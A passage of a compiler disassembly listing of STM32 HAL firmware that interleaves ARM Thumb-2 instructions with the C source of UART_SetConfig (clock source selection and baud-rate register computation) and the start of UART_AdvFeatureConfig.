 800550e:	4ba0      	ldr	r3, [pc, #640]	; (8005790 <UART_SetConfig+0x30c>)
 8005510:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005514:	f003 0303 	and.w	r3, r3, #3
 8005518:	2b03      	cmp	r3, #3
 800551a:	d81b      	bhi.n	8005554 <UART_SetConfig+0xd0>
 800551c:	a201      	add	r2, pc, #4	; (adr r2, 8005524 <UART_SetConfig+0xa0>)
 800551e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005522:	bf00      	nop
 8005524:	08005535 	.word	0x08005535
 8005528:	08005545 	.word	0x08005545
 800552c:	0800553d 	.word	0x0800553d
 8005530:	0800554d 	.word	0x0800554d
 8005534:	2301      	movs	r3, #1
 8005536:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800553a:	e080      	b.n	800563e <UART_SetConfig+0x1ba>
 800553c:	2302      	movs	r3, #2
 800553e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005542:	e07c      	b.n	800563e <UART_SetConfig+0x1ba>
 8005544:	2304      	movs	r3, #4
 8005546:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800554a:	e078      	b.n	800563e <UART_SetConfig+0x1ba>
 800554c:	2308      	movs	r3, #8
 800554e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005552:	e074      	b.n	800563e <UART_SetConfig+0x1ba>
 8005554:	2310      	movs	r3, #16
 8005556:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800555a:	e070      	b.n	800563e <UART_SetConfig+0x1ba>
 800555c:	68fb      	ldr	r3, [r7, #12]
 800555e:	681b      	ldr	r3, [r3, #0]
 8005560:	4a8c      	ldr	r2, [pc, #560]	; (8005794 <UART_SetConfig+0x310>)
 8005562:	4293      	cmp	r3, r2
 8005564:	d138      	bne.n	80055d8 <UART_SetConfig+0x154>
 8005566:	4b8a      	ldr	r3, [pc, #552]	; (8005790 <UART_SetConfig+0x30c>)
 8005568:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800556c:	f003 030c 	and.w	r3, r3, #12
 8005570:	2b0c      	cmp	r3, #12
 8005572:	d82d      	bhi.n	80055d0 <UART_SetConfig+0x14c>
 8005574:	a201      	add	r2, pc, #4	; (adr r2, 800557c <UART_SetConfig+0xf8>)
 8005576:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800557a:	bf00      	nop
 800557c:	080055b1 	.word	0x080055b1
 8005580:	080055d1 	.word	0x080055d1
 8005584:	080055d1 	.word	0x080055d1
 8005588:	080055d1 	.word	0x080055d1
 800558c:	080055c1 	.word	0x080055c1
 8005590:	080055d1 	.word	0x080055d1
 8005594:	080055d1 	.word	0x080055d1
 8005598:	080055d1 	.word	0x080055d1
 800559c:	080055b9 	.word	0x080055b9
 80055a0:	080055d1 	.word	0x080055d1
 80055a4:	080055d1 	.word	0x080055d1
 80055a8:	080055d1 	.word	0x080055d1
 80055ac:	080055c9 	.word	0x080055c9
 80055b0:	2300      	movs	r3, #0
 80055b2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055b6:	e042      	b.n	800563e <UART_SetConfig+0x1ba>
 80055b8:	2302      	movs	r3, #2
 80055ba:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055be:	e03e      	b.n	800563e <UART_SetConfig+0x1ba>
 80055c0:	2304      	movs	r3, #4
 80055c2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055c6:	e03a      	b.n	800563e <UART_SetConfig+0x1ba>
 80055c8:	2308      	movs	r3, #8
 80055ca:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055ce:	e036      	b.n	800563e <UART_SetConfig+0x1ba>
 80055d0:	2310      	movs	r3, #16
 80055d2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055d6:	e032      	b.n	800563e <UART_SetConfig+0x1ba>
 80055d8:	68fb      	ldr	r3, [r7, #12]
 80055da:	681b      	ldr	r3, [r3, #0]
 80055dc:	4a6a      	ldr	r2, [pc, #424]	; (8005788 <UART_SetConfig+0x304>)
 80055de:	4293      	cmp	r3, r2
 80055e0:	d12a      	bne.n	8005638 <UART_SetConfig+0x1b4>
 80055e2:	4b6b      	ldr	r3, [pc, #428]	; (8005790 <UART_SetConfig+0x30c>)
 80055e4:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80055e8:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 80055ec:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 80055f0:	d01a      	beq.n	8005628 <UART_SetConfig+0x1a4>
 80055f2:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 80055f6:	d81b      	bhi.n	8005630 <UART_SetConfig+0x1ac>
 80055f8:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 80055fc:	d00c      	beq.n	8005618 <UART_SetConfig+0x194>
 80055fe:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005602:	d815      	bhi.n	8005630 <UART_SetConfig+0x1ac>
 8005604:	2b00      	cmp	r3, #0
 8005606:	d003      	beq.n	8005610 <UART_SetConfig+0x18c>
 8005608:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800560c:	d008      	beq.n	8005620 <UART_SetConfig+0x19c>
 800560e:	e00f      	b.n	8005630 <UART_SetConfig+0x1ac>
 8005610:	2300      	movs	r3, #0
 8005612:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005616:	e012      	b.n	800563e <UART_SetConfig+0x1ba>
 8005618:	2302      	movs	r3, #2
 800561a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800561e:	e00e      	b.n	800563e <UART_SetConfig+0x1ba>
 8005620:	2304      	movs	r3, #4
 8005622:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005626:	e00a      	b.n	800563e <UART_SetConfig+0x1ba>
 8005628:	2308      	movs	r3, #8
 800562a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800562e:	e006      	b.n	800563e <UART_SetConfig+0x1ba>
 8005630:	2310      	movs	r3, #16
 8005632:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005636:	e002      	b.n	800563e <UART_SetConfig+0x1ba>
 8005638:	2310      	movs	r3, #16
 800563a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 800563e:	68fb      	ldr	r3, [r7, #12]
 8005640:	681b      	ldr	r3, [r3, #0]
 8005642:	4a51      	ldr	r2, [pc, #324]	; (8005788 <UART_SetConfig+0x304>)
 8005644:	4293      	cmp	r3, r2
 8005646:	d17a      	bne.n	800573e <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 8005648:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 800564c:	2b08      	cmp	r3, #8
 800564e:	d824      	bhi.n	800569a <UART_SetConfig+0x216>
 8005650:	a201      	add	r2, pc, #4	; (adr r2, 8005658 <UART_SetConfig+0x1d4>)
 8005652:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005656:	bf00      	nop
 8005658:	0800567d 	.word	0x0800567d
 800565c:	0800569b 	.word	0x0800569b
 8005660:	08005685 	.word	0x08005685
 8005664:	0800569b 	.word	0x0800569b
 8005668:	0800568b 	.word	0x0800568b
 800566c:	0800569b 	.word	0x0800569b
 8005670:	0800569b 	.word	0x0800569b
 8005674:	0800569b 	.word	0x0800569b
 8005678:	08005693 	.word	0x08005693
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 800567c:	f7fe fe6c 	bl	8004358 <HAL_RCC_GetPCLK1Freq>
 8005680:	61f8      	str	r0, [r7, #28]
        break;
 8005682:	e010      	b.n	80056a6 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005684:	4b44      	ldr	r3, [pc, #272]	; (8005798 <UART_SetConfig+0x314>)
 8005686:	61fb      	str	r3, [r7, #28]
        break;
 8005688:	e00d      	b.n	80056a6 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 800568a:	f7fe fdcd 	bl	8004228 <HAL_RCC_GetSysClockFreq>
 800568e:	61f8      	str	r0, [r7, #28]
        break;
 8005690:	e009      	b.n	80056a6 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005692:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005696:	61fb      	str	r3, [r7, #28]
        break;
 8005698:	e005      	b.n	80056a6 <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 800569a:	2300      	movs	r3, #0
 800569c:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800569e:	2301      	movs	r3, #1
 80056a0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 80056a4:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 80056a6:	69fb      	ldr	r3, [r7, #28]
 80056a8:	2b00      	cmp	r3, #0
 80056aa:	f000 8107 	beq.w	80058bc <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 80056ae:	68fb      	ldr	r3, [r7, #12]
 80056b0:	685a      	ldr	r2, [r3, #4]
 80056b2:	4613      	mov	r3, r2
 80056b4:	005b      	lsls	r3, r3, #1
 80056b6:	4413      	add	r3, r2
 80056b8:	69fa      	ldr	r2, [r7, #28]
 80056ba:	429a      	cmp	r2, r3
 80056bc:	d305      	bcc.n	80056ca <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 80056be:	68fb      	ldr	r3, [r7, #12]
 80056c0:	685b      	ldr	r3, [r3, #4]
 80056c2:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 80056c4:	69fa      	ldr	r2, [r7, #28]
 80056c6:	429a      	cmp	r2, r3
 80056c8:	d903      	bls.n	80056d2 <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 80056ca:	2301      	movs	r3, #1
 80056cc:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80056d0:	e0f4      	b.n	80058bc <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 80056d2:	69fb      	ldr	r3, [r7, #28]
 80056d4:	2200      	movs	r2, #0
 80056d6:	461c      	mov	r4, r3
 80056d8:	4615      	mov	r5, r2
 80056da:	f04f 0200 	mov.w	r2, #0
 80056de:	f04f 0300 	mov.w	r3, #0
 80056e2:	022b      	lsls	r3, r5, #8
 80056e4:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 80056e8:	0222      	lsls	r2, r4, #8
 80056ea:	68f9      	ldr	r1, [r7, #12]
 80056ec:	6849      	ldr	r1, [r1, #4]
 80056ee:	0849      	lsrs	r1, r1, #1
 80056f0:	2000      	movs	r0, #0
 80056f2:	4688      	mov	r8, r1
 80056f4:	4681      	mov	r9, r0
 80056f6:	eb12 0a08 	adds.w	sl, r2, r8
 80056fa:	eb43 0b09 	adc.w	fp, r3, r9
 80056fe:	68fb      	ldr	r3, [r7, #12]
 8005700:	685b      	ldr	r3, [r3, #4]
 8005702:	2200      	movs	r2, #0
 8005704:	603b      	str	r3, [r7, #0]
 8005706:	607a      	str	r2, [r7, #4]
 8005708:	e9d7 2300 	ldrd	r2, r3, [r7]
 800570c:	4650      	mov	r0, sl
 800570e:	4659      	mov	r1, fp
 8005710:	f7fa fd64 	bl	80001dc <__aeabi_uldivmod>
 8005714:	4602      	mov	r2, r0
 8005716:	460b      	mov	r3, r1
 8005718:	4613      	mov	r3, r2
 800571a:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 800571c:	69bb      	ldr	r3, [r7, #24]
 800571e:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 8005722:	d308      	bcc.n	8005736 <UART_SetConfig+0x2b2>
 8005724:	69bb      	ldr	r3, [r7, #24]
 8005726:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 800572a:	d204      	bcs.n	8005736 <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 800572c:	68fb      	ldr	r3, [r7, #12]
 800572e:	681b      	ldr	r3, [r3, #0]
 8005730:	69ba      	ldr	r2, [r7, #24]
 8005732:	60da      	str	r2, [r3, #12]
 8005734:	e0c2      	b.n	80058bc <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 8005736:	2301      	movs	r3, #1
 8005738:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 800573c:	e0be      	b.n	80058bc <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 800573e:	68fb      	ldr	r3, [r7, #12]
 8005740:	69db      	ldr	r3, [r3, #28]
 8005742:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 8005746:	d16a      	bne.n	800581e <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 8005748:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 800574c:	2b08      	cmp	r3, #8
 800574e:	d834      	bhi.n	80057ba <UART_SetConfig+0x336>
 8005750:	a201      	add	r2, pc, #4	; (adr r2, 8005758 <UART_SetConfig+0x2d4>)
 8005752:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005756:	bf00      	nop
 8005758:	0800577d 	.word	0x0800577d
 800575c:	0800579d 	.word	0x0800579d
 8005760:	080057a5 	.word	0x080057a5
 8005764:	080057bb 	.word	0x080057bb
 8005768:	080057ab 	.word	0x080057ab
 800576c:	080057bb 	.word	0x080057bb
 8005770:	080057bb 	.word	0x080057bb
 8005774:	080057bb 	.word	0x080057bb
 8005778:	080057b3 	.word	0x080057b3
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 800577c:	f7fe fdec 	bl	8004358 <HAL_RCC_GetPCLK1Freq>
 8005780:	61f8      	str	r0, [r7, #28]
        break;
 8005782:	e020      	b.n	80057c6 <UART_SetConfig+0x342>
 8005784:	efff69f3 	.word	0xefff69f3
 8005788:	40008000 	.word	0x40008000
 800578c:	40013800 	.word	0x40013800
 8005790:	40021000 	.word	0x40021000
 8005794:	40004400 	.word	0x40004400
 8005798:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 800579c:	f7fe fdf2 	bl	8004384 <HAL_RCC_GetPCLK2Freq>
 80057a0:	61f8      	str	r0, [r7, #28]
        break;
 80057a2:	e010      	b.n	80057c6 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 80057a4:	4b4c      	ldr	r3, [pc, #304]	; (80058d8 <UART_SetConfig+0x454>)
 80057a6:	61fb      	str	r3, [r7, #28]
        break;
 80057a8:	e00d      	b.n	80057c6 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 80057aa:	f7fe fd3d 	bl	8004228 <HAL_RCC_GetSysClockFreq>
 80057ae:	61f8      	str	r0, [r7, #28]
        break;
 80057b0:	e009      	b.n	80057c6 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 80057b2:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80057b6:	61fb      	str	r3, [r7, #28]
        break;
 80057b8:	e005      	b.n	80057c6 <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 80057ba:	2300      	movs	r3, #0
 80057bc:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 80057be:	2301      	movs	r3, #1
 80057c0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 80057c4:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 80057c6:	69fb      	ldr	r3, [r7, #28]
 80057c8:	2b00      	cmp	r3, #0
 80057ca:	d077      	beq.n	80058bc <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 80057cc:	69fb      	ldr	r3, [r7, #28]
 80057ce:	005a      	lsls	r2, r3, #1
 80057d0:	68fb      	ldr	r3, [r7, #12]
 80057d2:	685b      	ldr	r3, [r3, #4]
 80057d4:	085b      	lsrs	r3, r3, #1
 80057d6:	441a      	add	r2, r3
 80057d8:	68fb      	ldr	r3, [r7, #12]
 80057da:	685b      	ldr	r3, [r3, #4]
 80057dc:	fbb2 f3f3 	udiv	r3, r2, r3
 80057e0:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 80057e2:	69bb      	ldr	r3, [r7, #24]
 80057e4:	2b0f      	cmp	r3, #15
 80057e6:	d916      	bls.n	8005816 <UART_SetConfig+0x392>
 80057e8:	69bb      	ldr	r3, [r7, #24]
 80057ea:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 80057ee:	d212      	bcs.n	8005816 <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 80057f0:	69bb      	ldr	r3, [r7, #24]
 80057f2:	b29b      	uxth	r3, r3
 80057f4:	f023 030f 	bic.w	r3, r3, #15
 80057f8:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 80057fa:	69bb      	ldr	r3, [r7, #24]
 80057fc:	085b      	lsrs	r3, r3, #1
 80057fe:	b29b      	uxth	r3, r3
 8005800:	f003 0307 	and.w	r3, r3, #7
 8005804:	b29a      	uxth	r2, r3
 8005806:	8afb      	ldrh	r3, [r7, #22]
 8005808:	4313      	orrs	r3, r2
 800580a:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 800580c:	68fb      	ldr	r3, [r7, #12]
 800580e:	681b      	ldr	r3, [r3, #0]
 8005810:	8afa      	ldrh	r2, [r7, #22]
 8005812:	60da      	str	r2, [r3, #12]
 8005814:	e052      	b.n	80058bc <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005816:	2301      	movs	r3, #1
 8005818:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 800581c:	e04e      	b.n	80058bc <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 800581e:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005822:	2b08      	cmp	r3, #8
 8005824:	d827      	bhi.n	8005876 <UART_SetConfig+0x3f2>
 8005826:	a201      	add	r2, pc, #4	; (adr r2, 800582c <UART_SetConfig+0x3a8>)
 8005828:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800582c:	08005851 	.word	0x08005851
 8005830:	08005859 	.word	0x08005859
 8005834:	08005861 	.word	0x08005861
 8005838:	08005877 	.word	0x08005877
 800583c:	08005867 	.word	0x08005867
 8005840:	08005877 	.word	0x08005877
 8005844:	08005877 	.word	0x08005877
 8005848:	08005877 	.word	0x08005877
 800584c:	0800586f 	.word	0x0800586f
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005850:	f7fe fd82 	bl	8004358 <HAL_RCC_GetPCLK1Freq>
 8005854:	61f8      	str	r0, [r7, #28]
        break;
 8005856:	e014      	b.n	8005882 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005858:	f7fe fd94 	bl	8004384 <HAL_RCC_GetPCLK2Freq>
 800585c:	61f8      	str	r0, [r7, #28]
        break;
 800585e:	e010      	b.n	8005882 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005860:	4b1d      	ldr	r3, [pc, #116]	; (80058d8 <UART_SetConfig+0x454>)
 8005862:	61fb      	str	r3, [r7, #28]
        break;
 8005864:	e00d      	b.n	8005882 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005866:	f7fe fcdf 	bl	8004228 <HAL_RCC_GetSysClockFreq>
 800586a:	61f8      	str	r0, [r7, #28]
        break;
 800586c:	e009      	b.n	8005882 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800586e:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005872:	61fb      	str	r3, [r7, #28]
        break;
 8005874:	e005      	b.n	8005882 <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005876:	2300      	movs	r3, #0
 8005878:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800587a:	2301      	movs	r3, #1
 800587c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005880:	bf00      	nop
    }

    if (pclk != 0U)
 8005882:	69fb      	ldr	r3, [r7, #28]
 8005884:	2b00      	cmp	r3, #0
 8005886:	d019      	beq.n	80058bc <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005888:	68fb      	ldr	r3, [r7, #12]
 800588a:	685b      	ldr	r3, [r3, #4]
 800588c:	085a      	lsrs	r2, r3, #1
 800588e:	69fb      	ldr	r3, [r7, #28]
 8005890:	441a      	add	r2, r3
 8005892:	68fb      	ldr	r3, [r7, #12]
 8005894:	685b      	ldr	r3, [r3, #4]
 8005896:	fbb2 f3f3 	udiv	r3, r2, r3
 800589a:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 800589c:	69bb      	ldr	r3, [r7, #24]
 800589e:	2b0f      	cmp	r3, #15
 80058a0:	d909      	bls.n	80058b6 <UART_SetConfig+0x432>
 80058a2:	69bb      	ldr	r3, [r7, #24]
 80058a4:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 80058a8:	d205      	bcs.n	80058b6 <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 80058aa:	69bb      	ldr	r3, [r7, #24]
 80058ac:	b29a      	uxth	r2, r3
 80058ae:	68fb      	ldr	r3, [r7, #12]
 80058b0:	681b      	ldr	r3, [r3, #0]
 80058b2:	60da      	str	r2, [r3, #12]
 80058b4:	e002      	b.n	80058bc <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 80058b6:	2301      	movs	r3, #1
 80058b8:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 80058bc:	68fb      	ldr	r3, [r7, #12]
 80058be:	2200      	movs	r2, #0
 80058c0:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 80058c2:	68fb      	ldr	r3, [r7, #12]
 80058c4:	2200      	movs	r2, #0
 80058c6:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 80058c8:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 80058cc:	4618      	mov	r0, r3
 80058ce:	3728      	adds	r7, #40	; 0x28
 80058d0:	46bd      	mov	sp, r7
 80058d2:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 80058d6:	bf00      	nop
 80058d8:	00f42400 	.word	0x00f42400

080058dc <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 80058dc:	b480      	push	{r7}
 80058de:	b083      	sub	sp, #12
 80058e0:	af00      	add	r7, sp, #0
 80058e2:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 80058e4:	687b      	ldr	r3, [r7, #4]
 80058e6:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80058e8:	f003 0308 	and.w	r3, r3, #8
 80058ec:	2b00      	cmp	r3, #0
 80058ee:	d00a      	beq.n	8005906 <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 80058f0:	687b      	ldr	r3, [r7, #4]
 80058f2:	681b      	ldr	r3, [r3, #0]
 80058f4:	685b      	ldr	r3, [r3, #4]
 80058f6:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 80058fa:	687b      	ldr	r3, [r7, #4]
 80058fc:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 80058fe:	687b      	ldr	r3, [r7, #4]
 8005900:	681b      	ldr	r3, [r3, #0]
 8005902:	430a      	orrs	r2, r1
 8005904:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 8005906:	687b      	ldr	r3, [r7, #4]
 8005908:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800590a:	f003 0301 	and.w	r3, r3, #1
 800590e:	2b00      	cmp	r3, #0
 8005910:	d00a      	beq.n	8005928 <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 8005912:	687b      	ldr	r3, [r7, #4]
 8005914:	681b      	ldr	r3, [r3, #0]
 8005916:	685b      	ldr	r3, [r3, #4]
 8005918:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 800591c:	687b      	ldr	r3, [r7, #4]
 800591e:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8005920:	687b      	ldr	r3, [r7, #4]
 8005922:	681b      	ldr	r3, [r3, #0]
 8005924:	430a      	orrs	r2, r1
 8005926:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 8005928:	687b      	ldr	r3, [r7, #4]
 800592a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800592c:	f003 0302 	and.w	r3, r3, #2
 8005930:	2b00      	cmp	r3, #0
 8005932:	d00a      	beq.n	800594a <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 8005934:	687b      	ldr	r3, [r7, #4]
 8005936:	681b      	ldr	r3, [r3, #0]
 8005938:	685b      	ldr	r3, [r3, #4]
 800593a:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 800593e:	687b      	ldr	r3, [r7, #4]
 8005940:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8005942:	687b      	ldr	r3, [r7, #4]
 8005944:	681b      	ldr	r3, [r3, #0]
 8005946:	430a      	orrs	r2, r1
 8005948:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 800594a:	687b      	ldr	r3, [r7, #4]
 800594c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800594e:	f003 0304 	and.w	r3, r3, #4
 8005952:	2b00      	cmp	r3, #0
 8005954:	d00a      	beq.n	800596c <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 8005956:	687b      	ldr	r3, [r7, #4]
 8005958:	681b      	ldr	r3, [r3, #0]
 800595a:	685b      	ldr	r3, [r3, #4]
 800595c:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
